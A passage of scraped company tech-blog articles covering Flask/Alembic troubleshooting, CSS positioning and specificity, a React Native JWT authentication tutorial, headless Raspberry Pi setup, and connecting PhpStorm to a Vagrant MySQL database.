consistent method resolution order (MRO)\r\n\nIf you have created a base model (let\u2019s call it BaseModel) which inherits from db.Model, and then use it to define other models which also inherit from db.Model, it is possible you mixed the inheritance order: BaseModel should be first and then db.Model so that the method resolution order is consistent and BaseModel methods are not overrided by db.Model methods which have previously been overrided by BaseModel methods. Find out more on stackoverflow.\nYour class should begin with:\nclass YourModel(BaseModel, db.Model):\r\n\nNo application bound to current context\nApplication not registered on db instance and no application\r\n  bound to the current context\nYou have to link the application and the database object using db.init_app(app) or db.app = app (or both). Find out more on stackoverflow or in this blog post by Piotr Banaszkiewicz.\nAlembic states that there is nothing to migrate\nIf it appears that Alembic does not detect change despite the few lines you just added to your models, then make sure that you did not defined several SQLAlchemy object: there should be just one db instance (db = SQLAlchemy()) that you import in the other files.\nLet\u2019s say you wrote db = SQLAlchemy() in models.py, then in app.py you should have from models import db and nothing like a second db = SQLAlchemy()\nDatabase is not up to date\nalembic.util.exc.CommandError: Target database is not up to date.\nWell, the last Alembic version available in the migrations/versions/ is not the one indicated in your database alembic_version table (created by Alembic). Run python manage.py db upgrade to implement the migrations changes in the database.\nSome great resources\n\nA ready to use Flask App starter kit by antkahn, to go further than linking an app and a database!\nMore on how to run migrations with Alembic on realpython.com\nTutorial on a Flask \u2013 MySQL app with a frontend on code.tutsplus.com by Jay.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tAdrien Agnel\r\n  \t\t\t\r\n  \t\t\t\tAgile Web Developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tDo you sometimes try position: relative then absolute then relative again?\nDoes it take you more than 2 seconds to decide whether you\u2019re going to use padding or margin?\nHave you ever added more than 5 classes to make your CSS work?\nIf you said yes to one of these questions don\u2019t be ashamed, you\u2019re not alone.\nBut don\u2019t be afraid, acquiring those skills is a lot easier than you probably think.\nRelative or Absolute? Find the reference of your movement!\n\nThe position attribute has 5 different values: static, relative, absolute, fixed and sticky.\nWhereas fixed is quite straightforward and sticky is still barely used as its support is still limited, many developers struggle to use relative and absolute on point.\nSo let\u2019s dig into the differences between these positions and find an easy rule to decide which one to use.\nIf you want to experiment with static, relative and absolute positions, I\u2019ve made a Codepen on purpose.\n\nPerhaps even Albert Einstein hesitated between relativity and absolutivity\nStatic\nThat one is the default value.\nIt will add it to the flow as it is defined by other propopreties such as display, margin or padding.\nIf you try to use top, bottom, left or right it will have no effect.\nRelative\nposition: relative will move the element from the position it would have had, had it been positionned with static.\nSo using left: 20px will move your element 20 pixels on the left from its static position.\nOne more thing to notice is that elements around will behave as if its position were static.\nAbsolute\nIf you use top: 0 and left: 0;, your element will go on the top left corner of its first non static parent element.\nBe careful: if the element\u2019s parent\u2019s position is static, it won\u2019t be the reference!\nIf you want to make it\u00a0the reference, there\u2019s one simple trick : using position: relative\u00a0for the parent \ud83d\ude09\nAlso, all its siblings and parent elements will behave as if it didn\u2019t exist.\nSo, how to decide over relative or absolute?\n\u00a0\nThe key is to identify the reference for the position.\nposition: relative is to be used when you want to move an element from its static position.\nWhen you want to move your element inside its parent, then position: absolute is the best choice.\nMargin or Padding? Imagine your element was clickable!\n\nWhen you want to set spaces between elements in CSS you can either use margin or padding.\nThe 4 main differences between the 2 properties are:\n\nmargin is applied outside the border of an element, whereas padding is applied inside\nthe padding zone of an element is clickable if the element is clickable, the margin zone is not\nthe padding zone of an element has the same background color as the element, the margin zone the same as the element behind\nvertical margin values collapse \u2013 unless one of your elements is positionned with absolute or floating \u2013 see this Codepen\n\nSo, how to choose between the two?\nWell if the element I want to space has borders, it is pretty easy to find out: if the space is outside the borders then I use margin, otherwise I use padding.\nBut when it\u2019s not the case, I ask myself:\nIf the element was clickable, could I click on the space?\nOr its variant:\u00a0If the element had a background color, would the space had the same?\nIf so then I use padding!\n\u00a0\nHow many classes do I need to add? Know the rules of specificity!\nLet\u2019s say I want to center a paragraph, inside a div which has a class called intro. I could write it like:\n.intro p {\r\n  text-align: center;\r\n}\r\n\nBut sometimes it would not work, and when I opened my Dev Tools I would see this:\n\nCrap! Looks like Chrome has decided to take another rule before mine!\nHow can I override this? Well, there are some lazy ways: put !important which basically overrides everything, or put it as inline CSS.\n\nBut it is a bad idea to use !important, because if you want to override this rule later, well, you\u2019ll have no choice but to add an !important (and then, nothing becomes important anymore\u2026).\nSo how can I apply my new CSS rule?\nTo decide which rule to apply over another, Chrome\u00a0uses\u00a0the specificity\u00a0of each rule.\nHere is a simplified way of how it works:\n\nthe rule with the more ids wins\n\ne.g.\u00a0#lean\u00a0> .waterfall\n\n\nif there is a draw, the rule with the more classes wins\n\ne.g. .scrum .agile\u00a0> li.stock\n\n\nif there is a draw, the rule with the more tags wins\n\ne.g. ul\u00a0li a.improvement >\u00a0p.rework a\n\n\nif there is a draw, the rule declared last in the stylesheet wins\n\nFinal Word\nI\u2019ve met a lot of web developers who understand closures, functional programming, lambda calculus or who can retro-engineer APIs, package applications with Webpack in their sleep or even code efficiently with Vim.\nYet, these briliant people were completely naked when it came to centering a button on a page.\nIs it because it is super hard to do? Certainly not.\nIs it because they\u2019re not clever enough? Probably not.\nI can\u2019t tell for them, but I can tell for myself. For a long, long time I assumed CSS was easy, and not worth spending time to study it in depth. I even felt a bit ashamed every time I googled something about style. But it\u2019s not because something is simple that you should not try to master it. On the contrary, it takes only a few minutes to\u00a0understand\u00a0some\u00a0subtleties and that can\u00a0save you a lot of pain.\nThere\u2019s still a lot you can learn about CSS in the next minutes like why it does not make any sense to use z-indexes over 10 in most applications, how float works or you can get into flexbox if you\u2019ve got more time.\nIf you liked this article or you know fellow developers who might learn some tricks from it please share it, and leave a comment below if you think it can be improved!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLouis Zawadzki\r\n  \t\t\t\r\n  \t\t\t\tI drink tea and build web apps at Theodo.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWhen developing\u00a0a mobile app, it\u2019s common to have to build an authentication system. However, requiring the users to provide their username and password every time they\u00a0launches the app, severely deteriorates the user experience.\nLately, I have been working on a side project to build a mobile app with React Native and I wanted to implement a persistent user session. So, what I want to share today is how to:\n\nbootstrap an app that works both on Android and iOS platforms (thank you React Native!)\nallow a user to sign up or log in using a JWT authentication process with a backend API\nstore and recover an identity token from the phone\u2019s AsyncStorage\nallow the user to get content from an API\u2019s protected route using the id token\nverify the id token\u2019s existence to create the persistent user session\n\nSetting up the authentication API\nSince building a complete authentication API would take too much time, we\u2019ll use an authentication API sample coded by Auth0. Please refer to the repository\u2019s documentation for more details about the routes we\u2019ll be using as our app\u2019s backend.\nLet\u2019s clone the repo from GitHub and get the API up and running\ngit clone https://github.com/auth0-blog/nodejs-jwt-authentication-sample.git\r\ncd nodejs-jwt-authentication-sample\r\nnpm install\r\nnode server.js\r\n\nDISCLAIMER: It\u2019s worth noting that, for the purpose of this demo, we use http protocol. If you ever ship this code to a production environment, it\u2019s very important to use https for security reasons.\nBootstrap our React Native app\nIn order to keep this article more concise, I\u2019ll assume your React native development environment is already configured. In case you need any help with this, please take a look at this article, written by Gr\u00e9goire Hamaide, in which he explains how to install all you need to get started.\nLet\u2019s build our project:\nreact-native init ReactNativeAuth\r\ncd ReactNativeAuth\r\nreact-native run android\r\n\nOne of the biggest interests of using React Native is writing code that works both on Android and iOS platforms. We\u2019ll create a new directory called app, where a common code will be written and used by both platforms. Inside it, we\u2019ll create an index.js file that will be the entry point to our application:\n// app/index.js\r\n\r\nimport React, {Component} from 'react';\r\nimport {Text} from 'react-native';\r\n\r\nclass App extends Component {\r\n  render() {\r\n    return(\r\n      <Text> Hello World! </Text>\r\n    )\r\n  }\r\n}\r\n\r\nexport default App;\r\n\nIn order to redirect both Android and iOS entry points to app/index.js, we have to change both index.android.js and index.ios.js files:\n// index.android.js\r\n\r\nimport {AppRegistry} from 'react-native';\r\nimport App from './app';\r\n\r\nAppRegistry.registerComponent('ReactNativeAuth', () => App);\r\n\r\n\r\n\r\n// index.ios.js\r\n\r\nimport {AppRegistry} from 'react-native';\r\nimport App from './app';\r\n\r\nAppRegistry.registerComponent('ReactNativeAuth', () => App);\r\n\nBuilding the authentication system\nOur example app contains 2 pages:\n\nAn authentication page, where a user will be prompted an username and a password and will be able to either sign up or log in\nA protected homepage, where the user will be able to get protected content from the API or log out.\n\nSetting up the app\u2019s router and scenes\nOne of the most popular routing systems is react-native-router-flux, which is pretty simple to use and will allow us to focus on the authentication process without loosing too much time.\nDiscussing how to use the router is not our goal, so if you\u2019d like to get a better grasp of how to use it, please refer to this article written by Spencer Carli.\nLet\u2019s go and install it:\nyarn install react-native-router-flux\r\n\nWe\u2019ll import Router and Scene from react-native-router-flux package and create the 2 scenes we\u2019ve described earlier, which will be called Authentication and Homepage\n// app/index.js\r\n\r\nimport React, {Component} from 'react';\r\nimport {Router, Scene} from 'react-native-router-flux';\r\n\r\nclass App extends Component {\r\n  render() {\r\n    return(\r\n      <Router>\r\n        <Scene key='root'>\r\n          <Scene\r\n            component={Authentication}\r\n            hideNavBar={true}\r\n            initial={true}\r\n            key='Authentication'\r\n            title='Authentication'\r\n          />\r\n          <Scene\r\n            component={HomePage}\r\n            hideNavBar={true}\r\n            key='HomePage'\r\n            title='Home Page'\r\n          />\r\n        </Scene>\r\n      </Router>\r\n    )\r\n  }\r\n}\r\n\r\nexport default App;\r\n\nNow that the router is defined, let\u2019s create both our scenes and test the scene transitions to verify if our Router is working as expected. We\u2019ll start with the Authentication class:\n// app/routes/Authentication.js\r\n\r\nimport React, {Component} from 'react';\r\nimport {Text, TextInput, TouchableOpacity, View} from 'react-native';\r\nimport {Actions} from 'react-native-router-flux';\r\nimport styles from './styles';\r\n\r\nclass Authentication extends Component {\r\n\r\n  constructor() {\r\n    super();\r\n    this.state = { username: null, password: null };\r\n  }\r\n\r\n  userSignup() {\r\n    Actions.HomePage();\r\n  }\r\n\r\n  userLogin() {\r\n    Actions.HomePage();\r\n  }\r\n\r\n  render() {\r\n    return (\r\n      <View style={styles.container}>\r\n        <Text style={styles.title}> Welcome </Text>\r\n\r\n        <View style={styles.form}>\r\n          <TextInput\r\n            editable={true}\r\n            onChangeText={(username) => this.setState({username})}\r\n            placeholder='Username'\r\n            ref='username'\r\n            returnKeyType='next'\r\n            style={styles.inputText}\r\n            value={this.state.username}\r\n          />\r\n\r\n          <TextInput\r\n            editable={true}\r\n            onChangeText={(password) => this.setState({password})}\r\n            placeholder='Password'\r\n            ref='password'\r\n            returnKeyType='next'\r\n            secureTextEntry={true}\r\n            style={styles.inputText}\r\n            value={this.state.password}\r\n          />\r\n\r\n          <TouchableOpacity style={styles.buttonWrapper} onPress={this.userLogin.bind(this)}>\r\n            <Text style={styles.buttonText}> Log In </Text>\r\n          </TouchableOpacity>\r\n\r\n          <TouchableOpacity style={styles.buttonWrapper} onPress={this.userSignup.bind(this)}>\r\n            <Text style={styles.buttonText}> Sign Up </Text>\r\n          </TouchableOpacity>\r\n        </View>\r\n      </View>\r\n    );\r\n  }\r\n}\r\n\r\nexport default Authentication;\r\n\nLet\u2019s go through the details of what we just wrote. We have:\n\nan Authentication class with a constructor that sets the initial state with two uninitialized variables: username and password\nthe methods userSignup and userLogin that will be used further on to implement the authentication process. The only thing they do for now is to call the Action method from react-native-router-flux and make a scene to transition to the Homepage scene\na render method, which will display two text inputs (whose values are already bound to our Component\u2019s state) and two buttons, each one bound to the userSignup and userLogin methods.\n\nMoving forward and defining the Homepage class:\n// app/routes/Homepage.js\r\n\r\nimport React, {Component} from 'react';\r\nimport {Alert, Image, Text, TouchableOpacity, View} from 'react-native';\r\nimport {Actions} from 'react-native-router-flux';\r\nimport styles from './styles';\r\n\r\nclass HomePage extends Component {\r\n\r\n  getProtectedQuote() {\r\n    Alert.alert('We will print a Chuck Norris quote')\r\n  }\r\n\r\n  userLogout() {\r\n    Actions.Authentication();\r\n  }\r\n\r\n  render() {\r\n    return (\r\n      <View style={styles.container}>\r\n        <Image source={require('../images/chuck_norris.png')} style={styles.image}/>\r\n\r\n        <TouchableOpacity style={styles.buttonWrapper} onPress={this.getProtectedQuote}>\r\n          <Text style={styles.buttonText}> Get Chuck Norris quote! </Text>\r\n        </TouchableOpacity>\r\n\r\n        <TouchableOpacity style={styles.buttonWrapper} onPress={this.userLogout}>\r\n          <Text style={styles.buttonText} > Log out </Text>\r\n        </TouchableOpacity>\r\n      </View>\r\n    );\r\n  }\r\n}\r\n\r\nexport default HomePage;\r\n\nAgain, let\u2019s go through the details of what we just wrote. This time, we have:\n\na HomePage class with no constructor defined because our component is stateless\na getProtectedQuote method, that will be responsible for communicating with an API\u2019s protected route to recover a funny Chuck Norris quote. At the moment it just shows an alert popup with a title.\nan userLogout method, that redirects the user to the Authentication scene for now.\na render method, which will display an image and two buttons, each one bound to the getProtectedQuote and userLogout methods\n\nBoth our scenes import basic style properties from an external\u00a0file, which can be seen on our this project\u2019s repository.\nAuthenticating the user\nThe first step is to create a method that will save the received id token from the API in the AsyncStorage, the equivalent of the the browser\u2019s LocalStorage.\nThe reason the token needs to be stored is that we need to be able to recover it every time we have to call a protected API route and later on to create the persistent user session.\n// app/routes/Authentication.js\r\n\r\nimport {AsyncStorage, (...)} from 'react-native'\r\n\r\nclass Authentication extends Component {\r\n  (...)\r\n\r\n  async saveItem(item, selectedValue) {\r\n    try {\r\n      await AsyncStorage.setItem(item, selectedValue);\r\n    } catch (error) {\r\n      console.error('AsyncStorage error: ' + error.message);\r\n    }\r\n  }\r\n\r\n  (...)\r\n}\r\n\r\nexport default Authentication;\r\n\nThis method saves a selectedValue in the AsyncStorage under the key item. Any eventual error is logged to the console.\nWe are now ready to start coding our userSignup method:\n// app/routes/Authentication.js\r\n\r\nuserSignup() {\r\n  if (!this.state.username || !this.state.password) return;\r\n  // TODO: localhost doesn't work because the app is running inside an emulator. Get the IP address with ifconfig.\r\n  fetch('http://192.168.XXX.XXX:3001/users', {\r\n    method: 'POST',\r\n    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },\r\n    body: JSON.stringify({\r\n      username: this.state.username,\r\n      password: this.state.password,\r\n    })\r\n  })\r\n  .then((response) => response.json())\r\n  .then((responseData) => {\r\n    this.saveItem('id_token', responseData.id_token),\r\n    Alert.alert( 'Signup Success!', 'Click the button to get a Chuck Norris quote!'),\r\n    Actions.HomePage();\r\n  })\r\n  .done();\r\n}\r\n\nLet\u2019s explain what we\u2019ve just coded:\n\nFirst of all, we verify if the username and password fields have been filled (their initial value is null)\nWe use the Fetch API to make a POST request to our backend API, where the body contains the username and password from the component\u2019s state.\nIf the request succeeds, we store the returned id token in the AsyncStorage under the key id_token. Then we show the user an alert showing the sign-up process succeeded and redirect him/her to the protected scene HomePage.\n\nThe process to make the user login is pretty much the same:\n// app/routes/Authentication.js\r\n\r\nuserLogin() {\r\n  if (!this.state.username || !this.state.password) return;\r\n  // TODO: localhost doesn't work because the app is running inside an emulator. Get the IP address with ifconfig.\r\n  fetch('http://192.168.XXX.XXX:3001/sessions/create', {\r\n    method: 'POST',\r\n    headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },\r\n    body: JSON.stringify({\r\n      username: this.state.username,\r\n      password: this.state.password,\r\n    })\r\n  })\r\n  .then((response) => response.json())\r\n  .then((responseData) => {\r\n    this.saveItem('id_token', responseData.id_token),\r\n    Alert.alert('Login Success!', 'Click the button to get a Chuck Norris quote!'),\r\n    Actions.HomePage();\r\n  })\r\n  .done();\r\n}\r\n\nThe user may now create an account and log into the application with an id token correctly stored.\nThe next step is to write the userLogout method:\n// app/routes/HomePage.js\r\n\r\nimport {Alert, AsyncStorage, (...)} from 'react-native';\r\n\r\nclass HomePage extends Component {\r\n  (...)\r\n\r\n  async userLogout() {\r\n    try {\r\n      await AsyncStorage.removeItem('id_token');\r\n      Alert.alert('Logout Success!');\r\n      Actions.Authentication();\r\n    } catch (error) {\r\n      console.log('AsyncStorage error: ' + error.message);\r\n    }\r\n  }\r\n\r\n  (...)\r\n}\r\n\nWhat this method does is pretty straightforward. The stored item under the key id_token is removed from the AsyncStorage. Then the user is alerted that the session is over and he/she is redirected to the Authentication scene.\nGetting data from the protected API\u2019s route\nThe next step is to make use of the id token stored in the AsyncStorage to get protected content from the API. The token should be sent on the request\u2019s authorization header so that the API may verify the user\u2019s identify and return the content if authorized\n// app/routes/HomePage.js\r\n\r\ngetProtectedQuote() {\r\n  AsyncStorage.getItem('id_token').then((token) => {\r\n    // TODO: localhost doesn't work because the app is running inside an emulator. Get the IP address with ifconfig.\r\n    fetch('http://192.168.XXX.XXX:3001/api/protected/random-quote', {\r\n      method: 'GET',\r\n      headers: { 'Authorization': 'Bearer ' + token }\r\n    })\r\n    .then((response) => response.text())\r\n    .then((quote) => {\r\n      Alert.alert('Chuck Norris Quote', quote)\r\n    })\r\n    .done();\r\n  })\r\n}\r\n\nCreating a persistent user session\nAs of this moment, our application is completely functional! It\u2019s capable of performing the three basic authentication operations (sign-up, login, and log out) and using the user\u2019s identifier to get protected content from the API.\nHowever, there\u2019s still a problem to solve: every time the user closes the app and restarts it, he/she\u2019s required to go through the authentication process again.\nThe desired behavior is that, at the application launch, the existence of a token in the AsyncStorage is verified and dynamically change the initial parameter on our Router\u2018s scenes. The home page should be the initial scene if the user has a token. Otherwise, it should be the authentication scene.\nIf we look at a React component\u2019s lifecycle documentation, the method componentWillMount is called before the render method. If the existence of the token could be verified and the state set before the component is rendered, the problem would be solved, right? Wrong!\nLet\u2019s write the code for what we just said and then we\u2019ll discuss why it doesn\u2019t work:\n// app/index.js\r\n\r\nimport {AsyncStorage} from 'react-native';\r\n\r\nclass App extends Component {\r\n\r\n  constructor() {\r\n    super();\r\n    this.state = { hasToken: false };\r\n  }\r\n\r\n  componentWillMount() {\r\n    AsyncStorage.getItem('id_token').then((token) => {\r\n      this.setState({ hasToken: token !== null })\r\n    })\r\n  }\r\n\r\n  render() {\r\n    return(\r\n      <Router>\r\n        <Scene key='root'>\r\n          <Scene\r\n            component={Authentication}\r\n            initial={!this.state.hasToken}\r\n            (...)\r\n          />\r\n          <Scene\r\n            component={HomePage}\r\n            initial={this.state.hasToken}\r\n            (...)\r\n          />\r\n        </Scene>\r\n      </Router>\r\n    )\r\n  }\r\n}\r\n\nThere are three reasons why this approach doesn\u2019t work:\n\nthe access to the AsyncStorage is asynchronous, so the render method is executed before the state is set\nthe componentWillMount method doesn\u2019t trigger a re-rendering if the state changes\neven if the component re-rendered, once the Router is instantiated, the initial property will not be updated\n\nThus we must find a way to wait for the token\u2019s existence verification to finish before returning the Router on the render method.\nTo solve this problem, a loader will be returned by default on the render method. Once the token verification is finished, a 2nd state variable isLoaded will tell the render method to return the Router with the calculated value for the initial scene:\n// app/index.js\r\n\r\nimport {ActivityIndicator, AsyncStorage} from 'react-native';\r\n\r\nclass App extends Component {\r\n\r\n  constructor() {\r\n    super();\r\n    this.state = { hasToken: false, isLoaded: false };\r\n  }\r\n\r\n  componentDidMount() {\r\n    AsyncStorage.getItem('id_token').then((token) => {\r\n      this.setState({ hasToken: token !== null, isLoaded: true })\r\n    });\r\n  }\r\n\r\n  render() {\r\n    if (!this.state.isLoaded) {\r\n      return (\r\n        <ActivityIndicator />\r\n      )\r\n    } else {\r\n      return(\r\n        <Router>\r\n          <Scene key='root'>\r\n            <Scene\r\n              component={Authentication}\r\n              initial={!this.state.hasToken}\r\n              (...)\r\n            />\r\n            <Scene\r\n              component={HomePage}\r\n              initial={this.state.hasToken}\r\n              (...)\r\n            />\r\n            </Scene>\r\n        </Router>\r\n      )\r\n    }\r\n  }\r\n}\r\n\nConclusion\nIn this article we\u2019ve seen how to:\n\nshare a common codebase to build our Android and iOS apps;\nset up routes and scenes with react-native-router-flux;\ncommunicate to an API to set up a simple JWT authentication system;\nsave and retrieve elements from the AsyncStorage;\ncreate a persistent user session *\n\n* It\u2019s worth noting that a new authentication will be required once the token expires because there is no token renewal method.\nIf you have any questions or comments, please drop a line in the comments area below and I\u2019ll be glad to answer!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tFernando Beck\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tA Raspberry Pi is a low cost, small single-board computer.\nIt allows you to develop your own projects and let them run all day on this mini computer.\nPossibilities are endless: home automation, Internet of Things,\nrobotics projects, or run your own router, seedbox, NAS, \u2026\nYou can also use it as inexpensive project server.\nBut let\u2019s start from the beginning!\nIn this article, I will show you how easy it is to install a Raspberry Pi headless\nfrom scratch (meaning that you won\u2019t need another monitor, keyboard,\nmouse than the ones of your computer) so you will \u2018only\u2019 have to type your code\nfrom your pc and launch your server via ssh.\nIf you don\u2019t own a Raspberry Pi yet, maybe I\u2019ll make you want to buy one!\nPrerequisites\nOf course this tutorial require some stuff to work with:\n\nA Raspberry Pi, obviously\nAn ethernet cable\nA battery\nAn SD card\nYour computer\n\nThis can all be bought for around 50-80\u20ac on amazon or thePihut.\nInstall raspbian on your SD card\nAs any computer, your Raspberry Pi will need an operating system to work with.\nFirst, download Raspbian on their official page.\nRaspbian is a free OS based on Debian optimized for the Raspberry Pi architecture.\nIt contains the set of basic programs and utilities that make your Raspberry Pi run.\nPlug your SD card and find the disk where it is mount on your computer with\ndiskutil list with macOS or df -h on Linux.\nUnmount the disk and copy the OS on your SD card.\nFor Mac:\ndiskutil unmountDisk /dev/<disk where your SD card is mounted>\r\n\nor,\u00a0for Linux:\numount /dev/sdd1\r\n\nThen write the image to the card with\nsudo dd bs=1m if=<your .img file> of=/dev/rdisk<disk where your SD card is mount>\r\n\nRaspbian is now your Raspberry Pi new OS!\nRaspberry Pi doesn\u2019t have ssh activated by default.\nYou can (and should) authorize ssh by adding an empty file named ssh at boot directory\ncd <SD card directory> && touch ssh\r\n\nFirst connection\nNow, let\u2019s connect to your Raspberry Pi for the first time.\nFirst, you will need to find your Raspberry Pi ip.\nFind your computer ip address on the network and the subnet mask with\nifconfig | grep 'inet '\r\n\nThis will display your network interfaces ips (which should look like \u2018192.168\u2026..\u2019) and netmasks (for example if your netmask is 0xffffff00 your subnet mask is 24).\nThen find your Raspberry Pi ip\nsudo nmap -sP <Computer IP address>/<Subnet mask> | awk '/^Nmap/{ip=$NF}/B8:27:EB/{print ip}'\r\n\nThis will return the ip of your Raspberry Pi by checking all ip addresses of your local network, find the one of your Pi, and print it.\nYou can now connect with ssh to your Pi:\nThe initial user is Pi and the password is raspberry:\nssh pi@<IP>\r\n\nYou can edit your default configuration with raspi-config:\n\nOn your first connection, you should also upgrade your packages with\nsudo apt update\r\nsudo apt dist-upgrade\r\n\nand modify your root password with sudo passwd\nAuthorize your ssh key to connect without password\nIf you don\u2019t want to fill your password each time you connect to your Pi, you can authorize your ssh key.\nFollow this great github tutorial to generate a ssh key if needed.\nThen log to your Pi and create a .ssh directory on your Pi if it doesn\u2019t exist\nsudo su\r\ncd ~\r\ninstall -d -m 700 ~/.ssh\r\ntouch ~/.ssh/authorized_keys\r\n\nThen add your public key (on your computer at ~/.ssh/id_rsa.pub) to your Raspberry Pi at the end of ~/.ssh/authorized_keys\nYour first server on a Raspberry Pi\nIt\u2019s all set!\nNow let\u2019s try your newly configurated Raspberry Pi with a minimal project to see if\neverything works fine.\nLet\u2019s try it with a NodeJS server.\nFirst install NodeJS:\nwget http://node-arm.herokuapp.com/node_latest_armhf.deb\r\nsudo dpkg -i node_latest_armhf.deb\r\n\nCreate a file server.js with those lines\nvar http = require('http');\r\n\r\nvar server = http.createServer(function (request, response) {\r\n  response.writeHead(200, {\"Content-Type\": \"text/plain\"});\r\n  response.end(\"Hello World\\n\");\r\n});\r\n\r\nserver.listen(3000);\r\n\nRun it with node server.js and go to http://\\<IP>:3000/\nYou should be able to access to your first server hosted on a Raspberry Pi on your\nlocal network.\n\nDevelop from your host machine\nIt\u2019s all very nice, but you will obviously not be working in ssh for a substantial project.\nTo work from your computer, you will need to mount your distant directory on your computer.\nLuckily, this can easily be done with SSHFS.\nSSHFS (or Secure shell file system) lets you share a file system securely using\nSSH\u2019s SFTP protocol.\nSSHFS is based on the FUSE file system that allows a user with no privileges to access a file system without having to modify the kernel sources.\nNo more theory, let\u2019s practice.\nFirst, install SSHFS and FUSE (if you use a Mac, go to https://osxfuse.github.io/,\non Ubuntu/Debian sudo apt-get install sshfs).\nThen, create a directory on your computer and mount your Raspberry Pi project\ndirectory on it with SSHFS\nmkdir pi\r\nsshfs root@<IP>:<Path of your project on your Pi> pi\r\ncd pi\r\n\nYou can now access your project directory directly from your computer and modify your files.\nDon\u2019t forget to unmount the project when you are done:\numount tmp\r\n\nConclusion\nYou\u2019ve just learnt how to configure a Raspberry PI from scratch headlessly, if you\u2019re\ninteresting on the project stay tuned for next article about how to use it for home automation !\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tGuillaume Renouvin\r\n  \t\t\t\r\n  \t\t\t\tFull Stack developer at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nWhy should I care?\nHow many hours have you spent logged on your Vagrant trying to type your query, copying in a text editor, pasting, then raging because the console goes crazy and you have to start all over again?\nWell, spend five minutes to follow the next steps and see the pain of manipulating your data disappear!\nStep 1:\nOpen your project in PhpStorm and open the DataSource window:\n\nClick on View -> Tool Windows -> Database\nClick on the Database sidebar, click on new -> Datasource -> MySQL\nThe configuration window will appear\n\nStep 2: configure the ssh tunnel\n\nOpen your terminal.\ncd ~/path/to/your/project\nDisplay the configuration of your ssh connection with the command vagrant ssh-config\nOn the configuration window, click on the SSH/SSL tab\nReport the host, user and port\nChoose the Auth Type \u201cKey pair (OpenSSH)\u201d and report the path of the IdentityFile\n\n\nClick on the apply and then click on Test Connection, you should see an error message saying you\u2019ve got the wrong user/password combination\nStep 3: Set up the database configuration\n\nIn PhpStorm :\nClick on the General tab of the configuration of your datasource\nFill the credentials, host and port. If you\u2019re using Symfony, you can find it in the parameters.yml file.\nClick on Apply\nFinally, click on Test Connection\n\nCase 1 -> It works! congratulations you can now manipulate your DB from within your IDE\nCase 2 -> You get a wrong user/password combination error. Don\u2019t panic! just do the following:\n\nSSH into your Vagrant: vagrant ssh\nChange to root user sudo su\nLog as root user to your MySQL DB: mysql -uroot\nRun the following queries (don\u2019t forget to replace yourdatabase, youruser and your_password):\nGRANT ALL PRIVILEGES ON your_database.* TO 'your_user'@'127.0.0.1' identified by 'your_password';\nFLUSH PRIVILEGES;\nYou now have granted your user to login to using the host \u201c127.0.0.1\u201d\nYou can now go to PhpStorm and test your connection again and it should work!\n\nA few use examples:\n\nExplore the schema of your tables on the sidebar\nOpen the console file and enjoy:\n\nthe autocomplete\nthe syntactic correction and coloration\nwrite multiple queries and execute the one you want (Ctrl + Enter)\npaginated scrollable results\nexecute multiple queries at the same time, \n\n\nUpdate or add data to your database from the graphical interface.\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tQuentin Febvre\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
